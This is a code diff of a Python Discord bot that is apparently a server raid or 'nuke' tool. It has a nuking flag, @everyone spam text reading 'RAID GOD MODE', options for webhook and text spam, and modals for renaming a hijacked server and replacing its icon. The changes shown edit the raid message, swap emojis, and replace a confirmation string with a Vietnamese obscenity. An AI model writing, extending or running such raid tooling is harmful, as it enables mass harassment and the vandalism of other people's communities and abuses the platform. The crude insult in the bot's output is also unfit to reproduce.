@@ -14,7 +14,7 @@ bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)
 bot.nuking = False
 SPAM_MODE = "both"
 NEW_ICON_URL = "https://media.discordapp.net/attachments/1332244814892109885/1376589078753185862/static.png?ex=6835dffc&is=68348e7c&hm=f40c2f61a30d171b1c1a997c562f39c491a6ef09ec88b25b14a59c0c6478a6c3&=&format=webp&quality=lossless&width=320&height=320"
-CUSTOM_SPAM_TEXT = "@everyone 🔥 RAID GOD MODE! Không thoát được đâu!"
+CUSTOM_SPAM_TEXT = "@everyone 🔥 RAID GOD MODE! raid by long hip k12!"
 CUSTOM_ICON_URL = None
 CUSTOM_SERVER_NAME = None
 CUSTOM_CHANNEL_SUFFIX = None
@@ -51,23 +51,23 @@ class IconModal(discord.ui.Modal, title="Đổi icon server"):
     async def on_submit(self, interaction: discord.Interaction):
         global CUSTOM_ICON_URL
         CUSTOM_ICON_URL = self.icon_url.value
-        await interaction.response.send_message("✅ Đã cập nhật icon", ephemeral=True)
+        await interaction.response.send_message("Đã cập nhật icon", ephemeral=True)
 
-class NameModal(discord.ui.Modal, title="Đổi tên server"):
+class NameModal(discord.ui.Modal, title="name server"):
     name = discord.ui.TextInput(label="Tên server mới", required=True)
     async def on_submit(self, interaction: discord.Interaction):
         global CUSTOM_SERVER_NAME
         CUSTOM_SERVER_NAME = self.name.value
-        await interaction.response.send_message("✅ Đã cập nhật tên server", ephemeral=True)
+        await interaction.response.send_message("Ngu lồn", ephemeral=True)
 
 class SetupDropdown(discord.ui.Select):
     def __init__(self):
         options = [
             discord.SelectOption(label="Spam Webhook", value="webhook", emoji="🌐"),
-            discord.SelectOption(label="Spam Text", value="text", emoji="💬"),
-            discord.SelectOption(label="Spam Tất Cả", value="all", emoji="💣"),
-            discord.SelectOption(label="Cấu hình icon server", value="icon", emoji="🖼️"),
-            discord.SelectOption(label="Cấu hình tên server", value="name", emoji="🏷️"),
+            discord.SelectOption(label="Spam Text", value="text", emoji="😂"),
+            discord.SelectOption(label="Spam Tất Cả", value="all", emoji="🗿"),
+            discord.SelectOption(label="Cấu hình icon server", value="icon", emoji="🤢"),
+            discord.SelectOption(label="Cấu hình tên server", value="name", emoji="🥱"),
             discord.SelectOption(label="Cấu hình nội dung spam", value="spam_text", emoji="📢")
         ]
         super().__init__(placeholder="Chọn cấu hình...", options=options, min_values=1, max_values=1)
